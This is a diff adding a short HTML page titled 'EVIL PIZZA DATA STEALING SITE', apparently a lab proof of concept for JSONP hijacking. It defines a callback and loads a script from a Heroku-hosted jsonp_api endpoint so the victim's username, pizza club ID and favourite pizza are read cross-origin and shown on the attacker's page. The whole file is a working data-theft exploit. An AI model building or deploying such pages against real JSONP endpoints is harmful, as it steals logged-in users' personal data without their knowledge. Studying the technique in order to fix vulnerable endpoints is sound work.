@@ -1,0 +1,21 @@
+<head>
+<script src="http://code.jquery.com/jquery-3.1.1.js"></script>
+<script>
+function writeData(data){
+   $(function(){
+  var name=data.username;
+  var pizzaID = data.pizzaClubId;
+  var favoritePizza = data.favoritePizza;
+  var t =`Name: ${name}<br>Pizza of The Month ID:${pizzaID}<br>Favorite Pizza: ${favoritePizza}<br>`;
+  $('div').html(t);});
+}
+
+</script>
+<script src="https://immense-fortress-67240.herokuapp.com/jsonp_api?callback=writeData"></script>
+</head>
+<body>
+<h1>EVIL PIZZA DATA STEALING SITE</h1>
+<div id="data">
+</div>
+</body>
+
